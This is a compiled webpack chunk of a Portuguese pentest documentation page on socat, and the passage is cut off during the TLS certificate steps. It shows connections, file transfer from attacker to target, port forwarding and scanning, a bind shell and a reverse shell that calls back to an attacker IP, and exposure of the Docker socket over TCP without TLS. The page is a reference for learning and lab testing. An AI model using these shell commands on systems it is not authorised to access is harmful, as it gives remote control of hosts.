"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[1943],{4945:(e,a,s)=>{s.r(a),s.d(a,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>c,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"pentest/socat","title":"socat","description":"O socat (SOcket CAT) \xe9 uma ferramenta flex\xedvel de linha de comando que","source":"@site/docs/pentest/socat.mdx","sourceDirName":"pentest","slug":"/pentest/socat","permalink":"/my-docs/docs/pentest/socat","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"id":"socat","title":"socat"},"sidebar":"tutorialSidebar","previous":{"title":"paramspider","permalink":"/my-docs/docs/pentest/paramspider"},"next":{"title":"sqli","permalink":"/my-docs/docs/pentest/sqli"}}');var o=s(4848),r=s(8453);const c={id:"socat",title:"socat"},i=void 0,d={},l=[{value:"Principais usos",id:"principais-usos",level:2},{value:"Conectando",id:"conectando",level:2},{value:"Conex\xe3o TCP",id:"conex\xe3o-tcp",level:3},{value:"Conex\xe3o UDP",id:"conex\xe3o-udp",level:3},{value:"Escutando",id:"escutando",level:2},{value:"Escuta TCP",id:"escuta-tcp",level:3},{value:"Escuta UDP",id:"escuta-udp",level:3},{value:"Transfer\xeancia de Arquivos",id:"transfer\xeancia-de-arquivos",level:2},{value:"Upload",id:"upload",level:3},{value:"Download",id:"download",level:3},{value:"Encaminhando Sa\xedda de Comandos",id:"encaminhando-sa\xedda-de-comandos",level:2},{value:"Expondo Shell",id:"expondo-shell",level:2},{value:"Bind Shell",id:"bind-shell",level:3},{value:"Reverse Shell",id:"reverse-shell",level:3},{value:"Encapsulando em SSL/TLS",id:"encapsulando-em-ssltls",level:2},{value:"Exemplo de Conex\xe3o Criptografada",id:"exemplo-de-conex\xe3o-criptografada",level:3},{value:"Encaminhando Portas (Port Forwarding)",id:"encaminhando-portas-port-forwarding",level:2},{value:"Escaneando Portas",id:"escaneando-portas",level:2},{value:"Banner Grabbing",id:"banner-grabbing",level:2},{value:"HTTP",id:"http",level:3},{value:"FTP",id:"ftp",level:3},{value:"Expondo Unix Sock",id:"expondo-unix-sock",level:2},{value:"Expor o Socket sem SSL/TLS",id:"expor-o-socket-sem-ssltls",level:3},{value:"Expor o Socket com SSL/TLS",id:"expor-o-socket-com-ssltls",level:3},{value:"1. Vis\xe3o Geral do Fluxo",id:"1-vis\xe3o-geral-do-fluxo",level:4},{value:"2. Gera\xe7\xe3o de Certificados Autoassinados",id:"2-gera\xe7\xe3o-de-certificados-autoassinados",level:4},{value:"3. Estrutura de Pastas",id:"3-estrutura-de-pastas",level:4},{value:"4. Criar uma Autoridade Certificadora (CA)",id:"4-criar-uma-autoridade-certificadora-ca",level:4},{value:"5. Gerar o Certificado do Servidor (para o socat)",id:"5-gerar-o-certificado-do-servidor-para-o-socat",level:4},{value:"6. Gerar o Certificado do Cliente (para o Docker CLI)",id:"6-gerar-o-certificado-do-cliente-para-o-docker-cli",level:4},{value:"7. Executar o socat com TLS",id:"7-executar-o-socat-com-tls",level:4},{value:"8. Configurar o Docker CLI (Cliente) para usar TLS",id:"8-configurar-o-docker-cli-cliente-para-usar-tls",level:4},{value:"9. Considera\xe7\xf5es de Seguran\xe7a",id:"9-considera\xe7\xf5es-de-seguran\xe7a",level:4},{value:"10. Resumo",id:"10-resumo",level:4},{value:"Honeypot Simples",id:"honeypot-simples",level:2},{value:"Conclus\xe3o",id:"conclus\xe3o",level:2}];function t(e){const a={admonition:"admonition",br:"br",code:"code",em:"em",h2:"h2",h3:"h3",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsxs)(a.p,{children:["O ",(0,o.jsx)(a.code,{children:"socat"})," (",(0,o.jsx)(a.strong,{children:"SO"}),"cket ",(0,o.jsx)(a.strong,{children:"CAT"}),") \xe9 uma ferramenta flex\xedvel de linha de comando que\npermite a transfer\xeancia de dados entre dois endpoints, sejam eles soquetes\nTCP/UDP, portas seriais, arquivos, pipes ou at\xe9 mesmo conex\xf5es criptografadas.\nEle pode ser comparado ao ",(0,o.jsx)(a.code,{children:"nc"})," (netcat), mas oferece mais recursos e op\xe7\xf5es de\nconfigura\xe7\xe3o."]}),"\n",(0,o.jsx)(a.h2,{id:"principais-usos",children:"Principais usos"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsx)(a.li,{children:"Redirecionamento de portas (TCP e UDP);"}),"\n",(0,o.jsx)(a.li,{children:"Tunelamento de conex\xf5es, com ou sem criptografia;"}),"\n",(0,o.jsx)(a.li,{children:"Encapsulamento de dados em SSL/TLS;"}),"\n",(0,o.jsx)(a.li,{children:"Cria\xe7\xe3o de proxies TCP simples;"}),"\n",(0,o.jsx)(a.li,{children:"Escuta e teste de daemons de rede;"}),"\n",(0,o.jsx)(a.li,{children:"Transfer\xeancia de arquivos entre hosts;"}),"\n",(0,o.jsx)(a.li,{children:"Exposi\xe7\xe3o de shell (bind shell e reverse shell);"}),"\n",(0,o.jsx)(a.li,{children:"Encaminhamento de conex\xf5es para processos locais, portas seriais, etc."}),"\n"]}),"\n",(0,o.jsx)(a.h2,{id:"conectando",children:"Conectando"}),"\n",(0,o.jsxs)(a.p,{children:["Assim como o ",(0,o.jsx)(a.code,{children:"nc"}),", o ",(0,o.jsx)(a.code,{children:"socat"}),' pode efetuar conex\xf5es TCP. Por\xe9m, a sintaxe dele \xe9\ndiferente, pois precisamos especificar dois "addresses" (endere\xe7os) que ele ir\xe1\nconectar ou escutar.']}),"\n",(0,o.jsx)(a.h3,{id:"conex\xe3o-tcp",children:"Conex\xe3o TCP"}),"\n",(0,o.jsx)(a.p,{children:"Para estabelecer uma conex\xe3o TCP a um destino 172.16.1.4 na porta 110, podemos\nutilizar:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:172.16.1.4:110\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"STDIO"}),": indica que o socat usar\xe1 a entrada/sa\xedda padr\xe3o do terminal;",(0,o.jsx)(a.br,{}),"\n",(0,o.jsx)(a.strong,{children:"TCP:172.16.1.4:110"}),": indica que iremos utilizar TCP, conectando na porta 110\ndo IP 172.16.1.4."]})}),"\n",(0,o.jsx)(a.h3,{id:"conex\xe3o-udp",children:"Conex\xe3o UDP"}),"\n",(0,o.jsx)(a.p,{children:"Para utilizar UDP em vez de TCP, basta trocar a especifica\xe7\xe3o:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO UDP:127.0.0.1:9000\n"})}),"\n",(0,o.jsx)(a.h2,{id:"escutando",children:"Escutando"}),"\n",(0,o.jsxs)(a.p,{children:["O socat tamb\xe9m permite que voc\xea crie um ",(0,o.jsx)(a.em,{children:"listener"}),", ou seja, uma porta que\nficar\xe1 escutando conex\xf5es externas (semelhante ao ",(0,o.jsx)(a.code,{children:"nc -l"}),")."]}),"\n",(0,o.jsx)(a.h3,{id:"escuta-tcp",children:"Escuta TCP"}),"\n",(0,o.jsx)(a.p,{children:"Para escutar na porta 5050 em modo TCP:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"TCP-LISTEN:5050"}),": indica que vamos escutar na porta 5050 usando TCP;\n",(0,o.jsx)(a.strong,{children:"fork"}),": faz com que, a cada nova conex\xe3o, o processo seja duplicado (",(0,o.jsx)(a.em,{children:"fork"}),"),\npermitindo aceitar m\xfaltiplas conex\xf5es sequencialmente;\n",(0,o.jsx)(a.strong,{children:"STDOUT"}),": direciona a sa\xedda para a sa\xedda padr\xe3o."]})}),"\n",(0,o.jsx)(a.p,{children:"Depois, no outro lado, podemos nos conectar com:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:192.168.0.10:5050\n"})}),"\n",(0,o.jsx)(a.h3,{id:"escuta-udp",children:"Escuta UDP"}),"\n",(0,o.jsx)(a.p,{children:"Para escutar na porta 9000 com UDP:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat UDP-LISTEN:9000,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.h2,{id:"transfer\xeancia-de-arquivos",children:"Transfer\xeancia de Arquivos"}),"\n",(0,o.jsxs)(a.p,{children:["O socat pode ser utilizado para transferir arquivos ou dados de forma semelhante\nao ",(0,o.jsx)(a.code,{children:"nc"}),", pois ele simplesmente redireciona fluxos de dados."]}),"\n",(0,o.jsx)(a.h3,{id:"upload",children:"Upload"}),"\n",(0,o.jsx)(a.p,{children:"No alvo (que receber\xe1 o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"touch arquivo_recebido\nsocat TCP-LISTEN:5050,fork OPEN:arquivo_recebido\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:["Note que criamos o arquivo antes, mesmo que vazio, ele precisa existir.",(0,o.jsx)(a.br,{}),"\n",(0,o.jsxs)(a.strong,{children:["OPEN",":arquivo_recebido"]}),": faz com que tudo que chegar na porta 5050 seja\nescrito diretamente no arquivo ",(0,o.jsx)(a.code,{children:"arquivo_recebido"}),"."]})}),"\n",(0,o.jsx)(a.p,{children:"No atacante (que enviar\xe1 o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat OPEN:arquivo_para_enviar TCP:172.16.2.6:5050\n"})}),"\n",(0,o.jsx)(a.h3,{id:"download",children:"Download"}),"\n",(0,o.jsx)(a.p,{children:"No atacante (onde est\xe1 o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork OPEN:arquivo_para_enviar\n"})}),"\n",(0,o.jsx)(a.p,{children:"No alvo (que vai iniciar a conex\xe3o para baixar o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"touch arquivo_recebido\nsocat TCP:172.16.2.5:5050 OPEN:arquivo_recebido\n"})}),"\n",(0,o.jsx)(a.h2,{id:"encaminhando-sa\xedda-de-comandos",children:"Encaminhando Sa\xedda de Comandos"}),"\n",(0,o.jsxs)(a.p,{children:["Podemos redirecionar a sa\xedda de um comando para o socat a fim de enviar essa\nsa\xedda atrav\xe9s de uma conex\xe3o de rede.\nPor exemplo, para enviar a sa\xedda de ",(0,o.jsx)(a.code,{children:"cat /etc/os-release"})," para quem se conectar\nna porta 5050:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork SYSTEM:'cat /etc/os-release'\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Quando algu\xe9m se conectar usando outro ",(0,o.jsx)(a.code,{children:"socat"})," ou ",(0,o.jsx)(a.code,{children:"nc"})," nessa porta, receber\xe1 o\nconte\xfado do arquivo ",(0,o.jsx)(a.code,{children:"/etc/os-release"}),"."]}),"\n",(0,o.jsx)(a.h2,{id:"expondo-shell",children:"Expondo Shell"}),"\n",(0,o.jsx)(a.p,{children:"Assim como no nc, \xe9 poss\xedvel usar o socat para expor uma shell."}),"\n",(0,o.jsx)(a.h3,{id:"bind-shell",children:"Bind Shell"}),"\n",(0,o.jsxs)(a.p,{children:["Executado na m\xe1quina-alvo para abrir a porta 5050 e expor ",(0,o.jsx)(a.code,{children:"/bin/bash"}),":"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork EXEC:/bin/bash\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"EXEC:/bin/bash"}),": executa o comando /bin/bash e redireciona o I/O\n(Input/Output)."]})}),"\n",(0,o.jsx)(a.p,{children:"Depois, no atacante, basta conectar:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:192.168.0.10:5050\n"})}),"\n",(0,o.jsx)(a.h3,{id:"reverse-shell",children:"Reverse Shell"}),"\n",(0,o.jsx)(a.p,{children:"Executado na m\xe1quina-alvo, que far\xe1 a conex\xe3o ativa de volta para 192.168.0.100\nna porta 5050, expondo /bin/bash:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP:192.168.0.100:5050 EXEC:/bin/bash\n"})}),"\n",(0,o.jsx)(a.p,{children:"No atacante, precisamos escutar:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.h2,{id:"encapsulando-em-ssltls",children:"Encapsulando em SSL/TLS"}),"\n",(0,o.jsxs)(a.p,{children:["Um dos maiores diferenciais do socat em rela\xe7\xe3o ao ",(0,o.jsx)(a.code,{children:"nc"})," \xe9 a capacidade de\nestabelecer conex\xf5es criptografadas usando SSL/TLS de maneira nativa."]}),"\n",(0,o.jsx)(a.h3,{id:"exemplo-de-conex\xe3o-criptografada",children:"Exemplo de Conex\xe3o Criptografada"}),"\n",(0,o.jsx)(a.p,{children:"Servidor escutando em TLS:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat OPENSSL-LISTEN:443,cert=server.crt,key=server.key,verify=0,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.p,{children:"Cliente conectando-se ao servidor via TLS:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO OPENSSL:meuservidor.com:443,verify=0\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"Dica"}),": A op\xe7\xe3o ",(0,o.jsx)(a.code,{children:"verify=0"})," desabilita a verifica\xe7\xe3o do certificado, o que pode\nser \xfatil em testes ou ambientes de laborat\xf3rio. Em produ\xe7\xe3o, deve-se usar\nverifica\xe7\xe3o adequada."]})}),"\n",(0,o.jsx)(a.h2,{id:"encaminhando-portas-port-forwarding",children:"Encaminhando Portas (Port Forwarding)"}),"\n",(0,o.jsxs)(a.p,{children:["Com o ",(0,o.jsx)(a.code,{children:"socat"}),", \xe9 simples criar um t\xfanel redirecionando a porta local para outra\nporta/host."]}),"\n",(0,o.jsxs)(a.p,{children:["Por exemplo, se queremos que conex\xf5es na porta 8080 do host local sejam\nencaminhadas para ",(0,o.jsx)(a.code,{children:"192.168.1.100:80"}),", podemos usar:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80\n"})}),"\n",(0,o.jsx)(a.p,{children:"Qualquer conex\xe3o na porta local 8080 ser\xe1 ent\xe3o encaminhada para a porta 80 do\nendere\xe7o 192.168.1.100."}),"\n",(0,o.jsx)(a.h2,{id:"escaneando-portas",children:"Escaneando Portas"}),"\n",(0,o.jsxs)(a.p,{children:["O ",(0,o.jsx)(a.code,{children:"socat"})," n\xe3o \xe9 a melhor ferramenta para varredura de portas (como o ",(0,o.jsx)(a.code,{children:"nc"})," ou o\n",(0,o.jsx)(a.code,{children:"nmap"}),"), mas pode ser usado em scripts e one-liners para verificar a\ndisponibilidade de um determinado servi\xe7o."]}),"\n",(0,o.jsx)(a.p,{children:"Para testar se a porta 22 de um host est\xe1 aberta, podemos observar o retorno:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat - TCP:172.16.1.5:22\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Caso a conex\xe3o seja estabelecida, o ",(0,o.jsx)(a.code,{children:"socat"})," aguardar\xe1 dados (ou fechar\xe1 se n\xe3o\nhouver resposta). Se a porta estiver fechada ou filtrada, a conex\xe3o falhar\xe1 e o\n",(0,o.jsx)(a.code,{children:"socat"})," retornar\xe1 erro."]}),"\n",(0,o.jsxs)(a.p,{children:["Para varreduras mais elaboradas, ",(0,o.jsx)(a.code,{children:"nc"}),", ",(0,o.jsx)(a.code,{children:"ncat"})," ou nmap s\xe3o mais adequados."]}),"\n",(0,o.jsx)(a.h2,{id:"banner-grabbing",children:"Banner Grabbing"}),"\n",(0,o.jsx)(a.p,{children:'Tamb\xe9m podemos fazer o "banner grabbing" de um servi\xe7o, enviando comandos e\nanalisando as respostas diretamente no terminal.'}),"\n",(0,o.jsx)(a.h3,{id:"http",children:"HTTP"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"printf 'HEAD / HTTP/1.0\\n\\n' | \\\n  socat STDIO TCP:www.alvo.com:80\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Ao digitar o comando ",(0,o.jsx)(a.code,{children:"HEAD / HTTP/1.0"})," e pressionar Enter duas vezes (no comando\nacima represantado pelo ",(0,o.jsx)(a.code,{children:"\\n\\n"}),"), veremos o banner de resposta do servidor HTTP."]}),"\n",(0,o.jsx)(a.h3,{id:"ftp",children:"FTP"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:192.168.1.100:21\nUSER anonymous\nPASS anonymous\n"})}),"\n",(0,o.jsx)(a.h2,{id:"expondo-unix-sock",children:"Expondo Unix Sock"}),"\n",(0,o.jsxs)(a.p,{children:["Voc\xea pode usar o comando ",(0,o.jsx)(a.code,{children:"socat"})," para expor o socket do Docker via TCP, tanto\ncom quanto sem SSL/TLS. O ",(0,o.jsx)(a.code,{children:"socat"})," \xe9 uma ferramenta flex\xedvel que permite\nredirecionar conex\xf5es entre diferentes tipos de sockets."]}),"\n",(0,o.jsx)(a.h3,{id:"expor-o-socket-sem-ssltls",children:"Expor o Socket sem SSL/TLS"}),"\n",(0,o.jsx)(a.p,{children:"Execute o seguinte comando para expor o socket do Docker em um endpoint TCP:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"TCP-LISTEN:2375"}),": Escuta conex\xf5es TCP na porta 2375.\n",(0,o.jsx)(a.strong,{children:"reuseaddr"}),": Permite reutilizar o endere\xe7o.\n",(0,o.jsx)(a.strong,{children:"fork"}),": Cria um novo processo para cada conex\xe3o.\n",(0,o.jsx)(a.strong,{children:"UNIX-CONNECT:/var/run/docker.sock"}),": Conecta ao socket UNIX do Docker."]})}),"\n",(0,o.jsxs)(a.p,{children:["No cliente, voc\xea pode testar a conex\xe3o ao ",(0,o.jsx)(a.em,{children:"socket"})," exposto com o Docker CLI:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"docker -H tcp://<host>:2375 ps\n"})}),"\n",(0,o.jsx)(a.h3,{id:"expor-o-socket-com-ssltls",children:"Expor o Socket com SSL/TLS"}),"\n",(0,o.jsxs)(a.p,{children:["Abaixo segue um passo a passo detalhado de como expor o socket Unix do Docker\natrav\xe9s do ",(0,o.jsx)(a.strong,{children:"socat"})," com suporte a ",(0,o.jsx)(a.strong,{children:"TLS"}),", utilizando certificados\nautoassinados. Tamb\xe9m ser\xe1 demonstrada a forma de gera\xe7\xe3o de certificados tanto\ndo lado do servidor (onde roda o socat) quanto do lado do cliente (Docker CLI),\nde modo que a conex\xe3o possa ser verificada e segura."]}),"\n",(0,o.jsx)(a.h4,{id:"1-vis\xe3o-geral-do-fluxo",children:"1. Vis\xe3o Geral do Fluxo"}),"\n",(0,o.jsxs)(a.ol,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"Docker Daemon"})," exp\xf5e seu socket Unix localmente em ",(0,o.jsx)(a.code,{children:"/var/run/docker.sock"}),"."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"socat"})," escuta em uma porta TCP (por exemplo, ",(0,o.jsx)(a.code,{children:"2376"}),"), utilizando um\ncertificado ",(0,o.jsx)(a.strong,{children:"server"})," assinado por uma CA (Certification Authority), e faz a\nponte para o ",(0,o.jsx)(a.code,{children:"/var/run/docker.sock"}),"."]}),"\n",(0,o.jsxs)(a.li,{children:["O ",(0,o.jsx)(a.strong,{children:"Docker CLI"})," (cliente) precisa de um certificado ",(0,o.jsx)(a.strong,{children:"client"}),", assinado\npela mesma CA, para que a conex\xe3o TLS seja estabelecida e verificada com\nsucesso."]}),"\n",(0,o.jsx)(a.li,{children:"Ambos os lados (cliente e servidor) utilizam a mesma CA e precisam das chaves\ne certificados adequados."}),"\n"]}),"\n",(0,o.jsx)(a.h4,{id:"2-gera\xe7\xe3o-de-certificados-autoassinados",children:"2. Gera\xe7\xe3o de Certificados Autoassinados"}),"\n",(0,o.jsx)(a.p,{children:"Para que tenhamos um canal TLS confi\xe1vel, vamos criar nossa pr\xf3pria CA\n(autoridade certificadora), depois gerar certificados de servidor e cliente\nassinados por essa CA."}),"\n",(0,o.jsx)(a.h4,{id:"3-estrutura-de-pastas",children:"3. Estrutura de Pastas"}),"\n",(0,o.jsx)(a.p,{children:"Para organizar melhor, crie uma pasta para os certificados e entre nela:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"mkdir ~/docker-certs\ncd ~/docker-certs\n"})}),"\n",(0,o.jsx)(a.h4,{id:"4-criar-uma-autoridade-certificadora-ca",children:"4. Criar uma Autoridade Certificadora (CA)"}),"\n",(0,o.jsx)(a.p,{children:"Gerar chave privada da CA:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl genrsa -aes256 -out ca-key.pem 4096\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsx)(a.p,{children:"Ser\xe1 solicitada uma senha para proteger a chave da CA. Guarde essa senha em\nlocal seguro."})}),"\n",(0,o.jsx)(a.p,{children:"Gerar certificado raiz (self-signed) para a CA:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl req -new -x509 -days 3650 -key ca-key.pem -sha256 -out ca.pem\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"-days 3650"})," significa que o certificado ter\xe1 validade de 10 anos (ajuste\nconforme necess\xe1rio).",(0,o.jsx)(a.br,{}),"\n","Na parte interativa, voc\xea pode preencher os campos como quiser, mas atente-se\nespecialmente ao campo ",(0,o.jsx)(a.strong,{children:"Common Name"}),", pois \xe9 uma boa pr\xe1tica colocar algo que\nidentifique que este certificado \xe9 a CA, por exemplo: ",(0,o.jsx)(a.code,{children:"MyDockerCA"}),"."]})}),"\n",(0,o.jsx)(a.p,{children:"Agora voc\xea ter\xe1 dois arquivos importantes na pasta:"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"ca-key.pem"})," (chave privada da CA)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"ca.pem"})," (certificado p\xfablico da CA)"]}),"\n"]}),"\n",(0,o.jsx)(a.h4,{id:"5-gerar-o-certificado-do-servidor-para-o-socat",children:"5. Gerar o Certificado do Servidor (para o socat)"}),"\n",(0,o.jsxs)(a.p,{children:["O servidor precisar\xe1 de um certificado que ser\xe1 usado pelo socat. Ele ser\xe1\n",(0,o.jsx)(a.strong,{children:"assinado"})," pela nossa CA rec\xe9m-criada."]}),"\n",(0,o.jsx)(a.p,{children:"Gerar chave privada do servidor:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl genrsa -out server-key.pem 4096\n"})}),"\n",(0,o.jsxs)(a.p,{children:["\xc9 preciso criar o certificado de servidor com o campo SAN adequado para o host\nao qual voc\xea se conecta. A forma mais simples \xe9 utilizando um arquivo de\nconfigura\xe7\xe3o para o ",(0,o.jsx)(a.code,{children:"openssl"}),". Veja um modelo de arquivo de configura\xe7\xe3o:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-ini",metastring:'title="server.cnf"',children:"[ req ]\ndefault_bits       = 4096\ndistinguished_name = req_distinguished_name\nreq_extensions     = req_ext\nprompt            = no\n\n[ req_distinguished_name ]\nC  = BR\nST = Sao Paulo\nL  = Sao Paulo\nO  = MinhaEmpresa\nCN = my-docker-server\n\n[ req_ext ]\nsubjectAltName = @alt_names\n\n[ alt_names ]\nDNS.1 = my-docker-server\nDNS.2 = localhost\nIP.1  = 127.0.0.1\n"})}),"\n",(0,o.jsx)(a.p,{children:"Gerar uma CSR (Certificate Signing Request) usando o arquivo de configura\xe7\xe3o:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl req -new -key server-key.pem -out server.csr -config server.cnf\n"})}),"\n",(0,o.jsx)(a.p,{children:"Assinar o certificado do servidor com a CA:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl x509 -req -days 3650 -in server.csr -CA ca.pem -CAkey ca-key.pem \\\n  -CAcreateserial -out server-cert.pem -sha256\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:["Isso vai gerar o ",(0,o.jsx)(a.code,{children:"server-cert.pem"})," assinado pela CA.",(0,o.jsx)(a.br,{}),"\n","Ser\xe1 solicitada a senha da CA (caso voc\xea tenha usado -aes256 no passo anterior)."]})}),"\n",(0,o.jsx)(a.p,{children:"(Opcional) Remover frase de senha (passphrase) da chave do servidor para evitar\nintera\xe7\xf5es:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl rsa -in server-key.pem -out server-key.pem\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:["Somente se voc\xea quiser que o ",(0,o.jsx)(a.code,{children:"socat"})," n\xe3o pe\xe7a senha sempre que iniciar."]})}),"\n",(0,o.jsx)(a.p,{children:"Agora voc\xea tem os seguintes arquivos referentes ao servidor (socat):"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"server-key.pem"})," (chave privada do servidor)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"server-cert.pem"})," (certificado do servidor, assinado pela CA)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"server.csr"})," (a CSR, n\xe3o ser\xe1 necess\xe1ria mais ap\xf3s a assinatura)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"ca.pem"})," (certificado p\xfablico da CA)"]}),"\n"]}),"\n",(0,o.jsx)(a.h4,{id:"6-gerar-o-certificado-do-cliente-para-o-docker-cli",children:"6. Gerar o Certificado do Cliente (para o Docker CLI)"}),"\n",(0,o.jsx)(a.p,{children:"O lado cliente tamb\xe9m precisa ter um certificado para que o servidor possa\nverificar a identidade dele via TLS m\xfatua (mTLS). \xc9 praticamente o mesmo\nprocedimento:"}),"\n",(0,o.jsx)(a.p,{children:"Gerar chave privada do cliente:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl genrsa -out key.pem 4096\n"})}),"\n",(0,o.jsx)(a.p,{children:"Gerar CSR do cliente:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:'openssl req -subj "/CN=my-docker-client" -new -key key.pem -out client.csr\n'})}),"\n",(0,o.jsx)(a.p,{children:"Assinar o certificado do cliente usando a CA:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl x509 -req -days 3650 -in client.csr -CA ca.pem -CAkey ca-key.pem \\\n  -CAcreateserial -out cert.pem -sha256\n"})}),"\n",(0,o.jsx)(a.p,{children:"(Opcional) Remover a frase de senha da chave do cliente:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"openssl rsa -in key.pem -out key.pem\n"})}),"\n",(0,o.jsx)(a.p,{children:"Arquivos importantes do lado do cliente:"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"key.pem"})," (chave privada do cliente)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"cert.pem"})," (certificado do cliente, assinado pela CA)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"ca.pem"})," (certificado p\xfablico da CA) \u2013 \xe9 o mesmo arquivo ",(0,o.jsx)(a.code,{children:"ca.pem"})," que assinou 